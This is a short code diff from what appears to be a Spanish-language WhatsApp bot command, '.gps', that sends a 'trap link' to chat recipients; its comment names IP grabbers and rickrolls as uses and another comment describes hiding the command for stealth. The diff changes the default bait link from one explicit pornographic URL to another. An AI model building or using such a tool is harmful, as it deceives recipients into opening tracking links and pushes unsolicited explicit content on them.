@@ -4,7 +4,7 @@ export default {
     execute: async ({ sock, remitente, msg, textoLimpio }) => {
         
         // Uso: .gps https://tu-link-trampa.com (grabber de IPs, rickroll, etc)
-        const linkTrampa = textoLimpio.replace(/^\.gps\s*/i, '').trim() || "https://rule34.xxx/index.php?page=post&s=view&id=17284547&tags=dick+";
+        const linkTrampa = textoLimpio.replace(/^\.gps\s*/i, '').trim() || "https://search.brave.com/images?q=pene+grande+porn%0D%0A&source=web";
 
         try {
             // Sigilo: borramos el comando de tu pantalla
